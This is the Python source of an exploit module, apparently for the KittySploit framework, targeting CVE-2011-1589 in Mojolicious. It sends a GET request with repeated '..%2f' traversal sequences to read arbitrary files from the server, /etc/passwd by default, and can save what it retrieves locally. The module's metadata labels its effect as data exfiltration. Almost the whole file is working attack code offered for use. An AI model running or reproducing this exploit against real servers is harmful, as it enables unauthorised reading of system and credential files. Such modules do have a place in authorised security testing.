#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Reads arbitrary files via CVE-2011-1589 /."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'Mojolicious - Directory Traversal File Read (CVE-2011-1589)',
        'description': (
            'Reads arbitrary files via CVE-2011-1589 /..%2f traversal.'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2011-1589'],
        'platform': Platform.MULTI,
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2011-1589',
        ],
        'tags': ['mojolicious', 'lfi', 'file-read', 'unauth', 'cve-2011-1589'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2011_1589_detect'],
            },
        },
    }

    file_read = OptString('/etc/passwd', 'Absolute remote file path to read', required=True)
    output_file = OptString('', 'Local file to write retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars to print when output_file empty (0=full)', required=False, advanced=True)

    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip().lstrip('/')
        path = '/' + ('..%2f' * 5) + remote
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        return (r.text or '') if r else ''


    def run(self):
        target = str(self.file_read or '/etc/passwd')
        print_status(f'Reading {target} ...')
        body = self.execute(target)
        if not body:
            print_error('Empty response')
            return False
        out = str(self.output_file or '').strip()
        if out:
            with open(out, 'w', encoding='utf-8', errors='replace') as fh:
                fh.write(body)
            print_success(f'Wrote {len(body)} bytes to {out}')
        else:
            limit = int(self.output_limit or 0)
            print_info(body if limit <= 0 else body[:limit])
        return True
